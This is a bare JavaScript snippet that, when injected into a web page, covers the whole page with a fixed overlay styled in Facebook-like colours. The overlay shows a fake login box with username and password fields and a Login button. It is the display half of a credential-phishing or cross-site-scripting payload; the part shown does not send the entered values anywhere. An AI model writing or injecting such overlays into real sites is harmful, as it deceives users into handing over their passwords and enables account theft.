body = document.body;
if(body != null) {
div = document.createElement("div");
div.style.position = "fixed";
div.style.width = "100%";
div.style.height = "100%";
div.style.opacity = 2.8;
div.style.top = "+0px";
div.style.zIndex="9999";
div.style.bottom = "+0px";
div.style.left = "+0px";
div.style.backgroundColor = "#eceff5";
div.style.border = "0px solid #94a3c4";
div.style.padding = "0px";
div.innerHTML = "<br><br><br><center><input type=text placeholder=Username ><br><br><input type=password placeholder=Password><br><input type=button value=Login></center>"
body.appendChild(div);
}
